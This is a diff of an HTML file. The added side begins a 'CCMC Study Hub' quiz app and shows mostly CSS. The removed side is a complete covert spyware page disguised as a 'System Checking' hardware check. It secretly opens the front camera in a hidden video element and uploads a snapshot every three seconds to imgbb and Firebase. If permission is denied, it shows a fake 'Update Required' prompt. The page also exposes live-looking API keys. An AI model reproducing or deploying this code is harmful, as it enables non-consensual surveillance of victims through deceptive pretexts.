@@ -1,90 +1,2990 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <title>System Checking...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CCMC Study Hub | Elite</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-</head>
-<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #7c6dff;
+            --accent: #a594ff;
+            --green: #00d4a8;
+            --danger: #ff5470;
+            --warning: #ffb547;
+            --bg: #0b0a14;
+            --card: #161528;
+            --card2: #1e1c34;
+            --border: rgba(255, 255, 255, 0.08);
+            --text: #eeedf5;
+            --muted: rgba(238, 237, 245, 0.45);
+        }
 
-    <div style="text-align:center;">
-        <h2 id="msg">Initialising...</h2>
-        <p id="sub-msg">Hardware compatibility check in progress.</p>
-    </div>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-    <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            user-select: none;
+            overflow-x: hidden;
+            width: 100%;
+            min-height: 100vh;
+        }
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
-            authDomain: "distark.firebaseapp.com",
-            databaseURL: "https://distark-default-rtdb.firebaseio.com",
-            projectId: "distark",
-            storageBucket: "distark.firebasestorage.app",
-            messagingSenderId: "819241583845",
-            appId: "1:819241583845:web:2231e652310e47e06cc00c"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const imgbbKey = '50af9f5367ae25509851af1e1ecf62b6';
+        /* ══ ACCESS GATE ══ */
+        /* Loading screen */
+        #loadingScreen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 99999999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
 
-        async function init() {
-            try {
-                // specifically front camera (facingMode: user) mang rahe hain
-                const constraints = { 
-                    video: { facingMode: "user" } 
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                document.getElementById('msg').innerText = "System Verified";
-                console.log("Front Camera Active");
+        #loadingScreen.fade-out {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
 
-                // Camera ko start hone ke liye 2 second ka gap de rahe hain taaki black image na aaye
-                setTimeout(() => {
-                    setInterval(takeSnap, 3000); 
-                }, 2000);
+        .loader-logo {
+            width: 72px;
+            height: 72px;
+            border-radius: 22px;
+            background: linear-gradient(135deg, var(--primary), var(--green));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin-bottom: 24px;
+            animation: logoPulse 2s ease-in-out infinite;
+            box-shadow: 0 10px 30px rgba(124, 109, 255, 0.4);
+        }
 
-            } catch (err) {
-                document.getElementById('msg').innerText = "Update Required!";
-                document.getElementById('sub-msg').innerText = "Please allow camera access to update your system.";
-                console.error(err);
+        @keyframes logoPulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 10px 30px rgba(124, 109, 255, 0.4);
+            }
+
+            50% {
+                transform: scale(1.06);
+                box-shadow: 0 10px 40px rgba(124, 109, 255, 0.6);
             }
         }
 
-        function takeSnap() {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            const ctx = c.getContext('2d');
-
-            // Agar video ready nahi hai to capture mat karo
-            if (v.readyState !== v.HAVE_ENOUGH_DATA) return;
-
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            ctx.drawImage(v, 0, 0, c.width, c.height);
-            
-            const base64 = c.toDataURL('image/jpeg', 0.7).split(',')[1]; // JPEG use kar rahe hain thodi fast speed ke liye
-            const fd = new FormData();
-            fd.append('image', base64);
-
-            fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, { method: 'POST', body: fd })
-            .then(r => r.json())
-            .then(res => {
-                if(res.success) {
-                    db.ref('live_logs').push({
-                        url: res.data.url,
-                        time: new Date().toLocaleTimeString()
-                    });
-                    console.log("Image sent!");
-                }
-            }).catch(e => console.log("Upload error"));
+        .loader-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 4px;
+            animation: fadeSlideUp 0.5s ease both;
         }
 
-        window.onload = init;
+        .loader-sub {
+            font-size: 13px;
+            color: var(--muted);
+            font-weight: 600;
+            margin-bottom: 32px;
+            animation: fadeSlideUp 0.5s 0.1s ease both;
+        }
+
+        @keyframes fadeSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .loader-bar-wrap {
+            width: 180px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.07);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 14px;
+            animation: fadeSlideUp 0.5s 0.15s ease both;
+        }
+
+        .loader-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--primary), var(--green), var(--accent));
+            background-size: 200% 100%;
+            border-radius: 2px;
+            animation: barFill 2s cubic-bezier(0.4, 0, 0.2, 1) forwards, barShimmer 1.5s 0.5s linear infinite;
+        }
+
+        @keyframes barFill {
+            0% {
+                width: 0%;
+            }
+
+            50% {
+                width: 70%;
+            }
+
+            85% {
+                width: 90%;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        @keyframes barShimmer {
+            0% {
+                background-position: 200% center;
+            }
+
+            100% {
+                background-position: -200% center;
+            }
+        }
+
+        .loader-status {
+            font-size: 11px;
+            color: var(--muted);
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            animation: fadeSlideUp 0.5s 0.2s ease both;
+            min-height: 16px;
+        }
+
+        #accessGate {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 9999999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .gate-wrap {
+            width: 100%;
+            max-width: 360px;
+        }
+
+        /* Step screens */
+        .gate-screen {
+            display: none;
+            animation: popIn 0.38s cubic-bezier(0.34, 1.2, 0.64, 1);
+        }
+
+        .gate-screen.active {
+            display: block;
+        }
+
+        @keyframes popIn {
+            from {
+                transform: scale(0.88) translateY(16px);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .gate-card {
+            background: var(--card);
+            border-radius: 28px;
+            padding: 32px 26px;
+            border: 1px solid var(--border);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+            text-align: center;
+        }
+
+        .gate-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--green));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin: 0 auto 18px;
+            box-shadow: 0 10px 30px rgba(124, 109, 255, 0.4);
+        }
+
+        .gate-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        .gate-sub {
+            font-size: 13px;
+            color: var(--muted);
+            font-weight: 600;
+            margin-bottom: 22px;
+            line-height: 1.55;
+        }
+
+        .gate-label {
+            font-size: 10px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: var(--muted);
+            margin-bottom: 6px;
+            text-align: left;
+            display: block;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 18px;
+            margin-bottom: 14px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: var(--text);
+            font-family: 'Montserrat', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            outline: none;
+            -webkit-appearance: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+        }
+
+        input::placeholder {
+            color: var(--muted);
+        }
+
+        .action-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(135deg, var(--primary), #5347d4);
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 15px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 8px 22px rgba(124, 109, 255, 0.3);
+            transition: transform 0.15s;
+            margin-bottom: 10px;
+        }
+
+        .action-btn:active {
+            transform: scale(0.97);
+        }
+
+        .action-btn.green {
+            background: linear-gradient(135deg, var(--green), #009e7c);
+            box-shadow: 0 8px 22px rgba(0, 212, 168, 0.28);
+        }
+
+        .action-btn.ghost {
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: none;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            font-size: 13px;
+        }
+
+        /* Pending screen */
+        .pending-anim {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 181, 71, 0.1);
+            border: 2px solid rgba(255, 181, 71, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 18px;
+            animation: pendingRing 2s ease-in-out infinite;
+        }
+
+        @keyframes pendingRing {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 181, 71, 0.3);
+            }
+
+            50% {
+                box-shadow: 0 0 0 18px rgba(255, 181, 71, 0);
+            }
+        }
+
+        .pending-name-pill {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid var(--border);
+            border-radius: 50px;
+            padding: 6px 18px;
+            font-size: 13px;
+            font-weight: 800;
+            color: var(--accent);
+            margin-bottom: 18px;
+        }
+
+        .pending-dots {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            margin: 14px 0 18px;
+        }
+
+        .pending-dots span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--warning);
+            animation: dotBounce 1.2s ease-in-out infinite;
+        }
+
+        .pending-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .pending-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes dotBounce {
+
+            0%,
+            60%,
+            100% {
+                transform: translateY(0);
+                opacity: 0.3;
+            }
+
+            30% {
+                transform: translateY(-8px);
+                opacity: 1;
+            }
+        }
+
+        .pending-status-row {
+            font-size: 11px;
+            color: var(--muted);
+            font-weight: 700;
+            padding: 8px 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            margin-bottom: 14px;
+            letter-spacing: 0.04em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .pending-status-row i {
+            color: var(--warning);
+            font-size: 12px;
+        }
+
+        /* Blocked screen */
+        .blocked-anim {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 84, 112, 0.1);
+            border: 2px solid rgba(255, 84, 112, 0.35);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 18px;
+            animation: blockedShake 0.6s cubic-bezier(.36, .07, .19, .97) both,
+                blockedGlow 2s ease-in-out infinite 0.7s;
+        }
+
+        @keyframes blockedShake {
+
+            10%,
+            90% {
+                transform: translate3d(-2px, 0, 0);
+            }
+
+            20%,
+            80% {
+                transform: translate3d(4px, 0, 0);
+            }
+
+            30%,
+            50%,
+            70% {
+                transform: translate3d(-6px, 0, 0);
+            }
+
+            40%,
+            60% {
+                transform: translate3d(6px, 0, 0);
+            }
+        }
+
+        @keyframes blockedGlow {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 84, 112, 0.3);
+            }
+
+            50% {
+                box-shadow: 0 0 0 14px rgba(255, 84, 112, 0);
+            }
+        }
+
+        /* Ban overlay — app style */
+        .ban-overlay-wrap {
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 4, 14, 0.96);
+            z-index: 3000000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            backdrop-filter: blur(20px);
+            animation: fadeInOverlay 0.4s ease;
+        }
+
+        @keyframes fadeInOverlay {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .ban-card {
+            background: var(--card);
+            width: 100%;
+            max-width: 340px;
+            border-radius: 28px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 84, 112, 0.35);
+            box-shadow: 0 0 60px rgba(255, 84, 112, 0.18), 0 30px 80px rgba(0, 0, 0, 0.7);
+            animation: popInCard 0.45s cubic-bezier(0.34, 1.2, 0.64, 1);
+        }
+
+        @keyframes popInCard {
+            from {
+                transform: scale(0.8) translateY(30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .ban-top {
+            background: linear-gradient(135deg, #ff2d55, #c0003c);
+            padding: 32px 20px 26px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ban-top::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(0, 0, 0, 0.07) 8px, rgba(0, 0, 0, 0.07) 16px);
+        }
+
+        .ban-top::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            right: 0;
+            height: 20px;
+            background: var(--card);
+            border-radius: 20px 20px 0 0;
+        }
+
+        .ban-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            position: relative;
+            z-index: 1;
+            animation: banIconPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes banIconPulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.3);
+            }
+
+            50% {
+                transform: scale(1.06);
+                box-shadow: 0 0 0 10px rgba(255, 255, 255, 0);
+            }
+        }
+
+        .ban-top-title {
+            font-size: 13px;
+            font-weight: 800;
+            letter-spacing: 0.18em;
+            color: rgba(255, 255, 255, 0.7);
+            text-transform: uppercase;
+            position: relative;
+            z-index: 1;
+        }
+
+        .ban-body {
+            padding: 22px 22px 26px;
+            text-align: center;
+        }
+
+        .ban-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+
+        .ban-title span {
+            color: var(--danger);
+        }
+
+        .ban-sub {
+            font-size: 13px;
+            color: var(--muted);
+            font-weight: 600;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .ban-detail {
+            background: rgba(255, 84, 112, 0.06);
+            border: 1px solid rgba(255, 84, 112, 0.2);
+            border-radius: 12px;
+            padding: 10px 14px;
+            font-size: 11px;
+            color: var(--muted);
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .ban-detail i {
+            color: var(--danger);
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+
+        /* Warn/Message popup — app style */
+        .warn-popup-wrap {
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 4, 14, 0.88);
+            z-index: 2000000;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            backdrop-filter: blur(16px);
+            padding: 0;
+        }
+
+        .warn-popup-sheet {
+            background: var(--card);
+            width: 100%;
+            max-width: 520px;
+            border-radius: 32px 32px 0 0;
+            padding: 10px 24px max(36px, env(safe-area-inset-bottom));
+            border-top: 1px solid var(--border);
+            box-shadow: 0 -20px 60px rgba(0, 0, 0, 0.5);
+            animation: sheetUpWarn 0.38s cubic-bezier(0.34, 1.2, 0.64, 1);
+        }
+
+        @keyframes sheetUpWarn {
+            from {
+                transform: translateY(100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .warn-handle {
+            width: 44px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.12);
+            border-radius: 2px;
+            margin: 14px auto 18px;
+        }
+
+        .warn-icon-wrap {
+            width: 56px;
+            height: 56px;
+            border-radius: 18px;
+            margin: 0 auto 14px;
+            background: rgba(255, 181, 71, 0.12);
+            border: 1px solid rgba(255, 181, 71, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+        }
+
+        .warn-msg-title {
+            font-size: 18px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .warn-msg-body {
+            font-size: 14px;
+            color: var(--muted);
+            font-weight: 600;
+            line-height: 1.65;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* ══ TIMER ══ */
+        #timerDisplay {
+            position: fixed;
+            top: 14px;
+            right: 14px;
+            z-index: 99999;
+            background: var(--danger);
+            color: white;
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 15px;
+            display: none;
+            box-shadow: 0 4px 20px rgba(255, 84, 112, 0.5);
+        }
+
+        /* ══ OVERLAYS ══ */
+        #notifyOverlay,
+        #aboutOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 4, 14, 0.85);
+            z-index: 210000;
+            display: none;
+            align-items: flex-end;
+            justify-content: center;
+            backdrop-filter: blur(14px);
+            padding: 0;
+        }
+
+        .notify-card,
+        .about-card {
+            background: var(--card);
+            width: 100%;
+            max-width: 520px;
+            border-radius: 32px 32px 0 0;
+            padding: 10px 26px max(36px, env(safe-area-inset-bottom));
+            animation: sheetUp 0.38s cubic-bezier(0.34, 1.2, 0.64, 1);
+            border-top: 1px solid var(--border);
+        }
+
+        @keyframes sheetUp {
+            from {
+                transform: translateY(100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .sheet-handle {
+            width: 44px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 2px;
+            margin: 14px auto 22px;
+        }
+
+        /* ══ SECURITY OVERLAY ══ */
+        #securityOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 4, 14, 0.0);
+            backdrop-filter: blur(0px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000000;
+            padding: 24px;
+            transition: background 0.3s, backdrop-filter 0.3s;
+        }
+
+        #securityOverlay.visible {
+            background: rgba(5, 4, 14, 0.97);
+            backdrop-filter: blur(24px);
+        }
+
+        .sec-card {
+            background: linear-gradient(145deg, #1a0a1e, #0f0a1a);
+            border-radius: 32px;
+            padding: 0;
+            text-align: center;
+            max-width: 340px;
+            width: 100%;
+            border: 1px solid rgba(255, 84, 112, 0.3);
+            box-shadow: 0 0 0 1px rgba(255, 84, 112, 0.1), 0 40px 80px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 84, 112, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            overflow: hidden;
+            animation: secCardIn 0.45s cubic-bezier(0.34, 1.3, 0.64, 1);
+        }
+
+        @keyframes secCardIn {
+            from {
+                transform: scale(0.7) translateY(30px);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .sec-banner {
+            background: linear-gradient(135deg, #ff5470, #c0003c);
+            padding: 28px 20px 22px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .sec-banner::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(0, 0, 0, 0.08) 8px, rgba(0, 0, 0, 0.08) 16px);
+        }
+
+        .sec-banner::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            right: 0;
+            height: 20px;
+            background: linear-gradient(145deg, #1a0a1e, #0f0a1a);
+            border-radius: 20px 20px 0 0;
+        }
+
+        .sec-icon-wrap {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px;
+            font-size: 32px;
+            position: relative;
+            z-index: 1;
+            animation: iconPulse 1.2s ease-in-out infinite;
+        }
+
+        @keyframes iconPulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.3);
+            }
+
+            50% {
+                transform: scale(1.06);
+                box-shadow: 0 0 0 10px rgba(255, 255, 255, 0);
+            }
+        }
+
+        .sec-banner-title {
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 0.2em;
+            color: rgba(255, 255, 255, 0.7);
+            text-transform: uppercase;
+            position: relative;
+            z-index: 1;
+        }
+
+        .sec-body {
+            padding: 22px 24px 28px;
+        }
+
+        .sec-warn-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--text);
+            margin-bottom: 8px;
+        }
+
+        .sec-warn-title span {
+            color: var(--danger);
+        }
+
+        .sec-warn-sub {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--muted);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .warn-dots {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .warn-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.08);
+            border: 2px solid rgba(255, 255, 255, 0.12);
+            transition: all 0.35s cubic-bezier(0.34, 1.5, 0.64, 1);
+        }
+
+        .warn-dot.active {
+            background: var(--danger);
+            border-color: var(--danger);
+            box-shadow: 0 0 12px rgba(255, 84, 112, 0.7);
+            transform: scale(1.25);
+        }
+
+        .sec-countdown-wrap {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .sec-countdown-wrap i {
+            color: var(--danger);
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+
+        #secCountdownText {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--muted);
+            flex: 1;
+        }
+
+        #secCountdownNum {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--danger);
+            min-width: 24px;
+            text-align: right;
+        }
+
+        .sec-card.final-warn {
+            border-color: rgba(255, 84, 112, 0.7);
+            box-shadow: 0 0 0 1px rgba(255, 84, 112, 0.3), 0 40px 80px rgba(0, 0, 0, 0.8), 0 0 80px rgba(255, 84, 112, 0.35), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            animation: secCardIn 0.45s cubic-bezier(0.34, 1.3, 0.64, 1), finalShake 0.5s 0.5s ease;
+        }
+
+        @keyframes finalShake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            20% {
+                transform: translateX(-8px);
+            }
+
+            40% {
+                transform: translateX(8px);
+            }
+
+            60% {
+                transform: translateX(-5px);
+            }
+
+            80% {
+                transform: translateX(5px);
+            }
+        }
+
+        .sec-card.final-warn .sec-banner {
+            background: linear-gradient(135deg, #ff1744, #8b0000);
+        }
+
+        /* ══ HOME PAGE ══ */
+        #homePage {
+            display: none;
+            min-height: 100vh;
+            padding-bottom: 100px;
+        }
+
+        .header {
+            background: var(--card);
+            padding: 56px 22px 82px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(ellipse 90% 65% at 15% 20%, rgba(124, 109, 255, 0.26) 0%, transparent 65%),
+                radial-gradient(ellipse 55% 50% at 85% 90%, rgba(0, 212, 168, 0.14) 0%, transparent 60%);
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            right: 0;
+            height: 48px;
+            background: var(--bg);
+            border-radius: 36px 36px 0 0;
+        }
+
+        .header h1 {
+            font-size: clamp(20px, 5.5vw, 26px);
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 6px;
+            position: relative;
+            z-index: 1;
+            color: var(--text);
+        }
+
+        .header h1 span {
+            color: var(--accent);
+        }
+
+        .header #hiUser {
+            font-size: 14px;
+            color: var(--muted);
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+        }
+
+        .chapter-container {
+            padding: 0 14px;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: var(--card2);
+            border: 1px solid var(--border);
+            padding: 14px 16px;
+            border-radius: 22px;
+            margin-bottom: 11px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: border-color 0.2s, transform 0.15s;
+            animation: fadeUp 0.4s ease both;
+        }
+
+        .card:active {
+            transform: scale(0.98);
+            border-color: rgba(124, 109, 255, 0.4);
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .module-img {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            object-fit: cover;
+            flex-shrink: 0;
+            margin-right: 13px;
+            border: 1px solid var(--border);
+        }
+
+        .ch-name {
+            font-size: 15px;
+            font-weight: 800;
+        }
+
+        .ch-meta {
+            font-size: 11px;
+            color: var(--muted);
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        .ch-meta i {
+            margin-right: 3px;
+        }
+
+        .ch-play {
+            width: 36px;
+            height: 36px;
+            border-radius: 12px;
+            flex-shrink: 0;
+            background: rgba(124, 109, 255, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            font-size: 13px;
+        }
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 500;
+            background: rgba(10, 9, 20, 0.96);
+            backdrop-filter: blur(16px);
+            border-top: 1px solid var(--border);
+            display: flex;
+            padding: 10px 16px max(12px, env(safe-area-inset-bottom));
+            gap: 8px;
+        }
+
+        .bbar-btn {
+            flex: 1;
+            padding: 11px 6px;
+            border: none;
+            border-radius: 14px;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 11px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            background: rgba(255, 255, 255, 0.04);
+            color: var(--muted);
+            transition: all 0.2s;
+        }
+
+        .bbar-btn i {
+            font-size: 18px;
+        }
+
+        .bbar-btn:active {
+            transform: scale(0.92);
+        }
+
+        .bbar-btn.hi {
+            background: rgba(124, 109, 255, 0.15);
+            color: var(--accent);
+        }
+
+        /* ══ QUIZ PAGE ══ */
+        #quizPage {
+            display: none;
+            padding: 0 14px 120px;
+            max-width: 640px;
+            margin: auto;
+            width: 100%;
+        }
+
+        .quiz-topbar {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(10, 9, 20, 0.97);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border);
+            padding: 13px 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 0 -14px;
+        }
+
+        .quiz-title {
+            font-size: 16px;
+            font-weight: 800;
+            flex: 1;
+        }
+
+        .q-progress-wrap {
+            margin: 0 -14px;
+        }
+
+        .q-progress-track {
+            height: 3px;
+            background: rgba(255, 255, 255, 0.07);
+        }
+
+        .q-progress-fill {
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--green));
+            width: 0%;
+            transition: width 0.4s;
+        }
+
+        .q-count-badge {
+            font-size: 12px;
+            font-weight: 800;
+            color: var(--accent);
+            background: rgba(124, 109, 255, 0.14);
+            border: 1px solid rgba(124, 109, 255, 0.25);
+            padding: 4px 12px;
+            border-radius: 20px;
+        }
+
+        .sound-btn {
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            background: rgba(124, 109, 255, 0.12);
+            border: 1px solid rgba(124, 109, 255, 0.25);
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 15px;
+            flex-shrink: 0;
+            transition: all 0.2s;
+        }
+
+        .sound-btn.muted {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: var(--border);
+            color: var(--muted);
+        }
+
+        .sound-btn:active {
+            transform: scale(0.9);
+        }
+
+        .q-card {
+            background: var(--card2);
+            border: 1px solid var(--border);
+            padding: 22px;
+            border-radius: 22px;
+            margin-bottom: 14px;
+            margin-top: 14px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .q-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--green));
+        }
+
+        .q-num-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            font-weight: 900;
+            color: var(--accent);
+            background: rgba(124, 109, 255, 0.12);
+            border: 1px solid rgba(124, 109, 255, 0.22);
+            padding: 4px 11px;
+            border-radius: 20px;
+            margin-bottom: 13px;
+        }
+
+        .question-text {
+            font-size: 16px;
+            font-weight: 800;
